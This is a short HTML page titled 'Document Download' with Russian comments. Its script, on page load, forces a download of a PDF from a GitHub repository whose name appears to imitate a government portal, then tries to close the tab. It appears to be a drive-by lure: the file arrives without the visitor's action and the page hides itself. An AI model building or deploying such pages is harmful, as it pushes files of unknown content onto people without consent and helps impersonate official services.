
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Download</title>
</head>
<body>

<script>
(async function () {

    const pdfUrl =
    "https://github.com/my-govuz/my-gov_/raw/refs/heads/main/down-2026-27-12_17-00-55.pdf";

    // Создаём ссылку для скачивания
    const link = document.createElement("a");

    link.href = pdfUrl;
    link.download = "document.pdf";

    document.body.appendChild(link);

    // Запускаем загрузку
    link.click();

    link.remove();

    // Даём браузеру время начать скачивание
    setTimeout(() => {

        // Пытаемся закрыть текущую вкладку
        window.close();

        // Дополнительная попытка
        if (!window.closed) {
            window.open("", "_self");
            window.close();
        }

    }, 1500);

})();
</script>

</body>
</html>
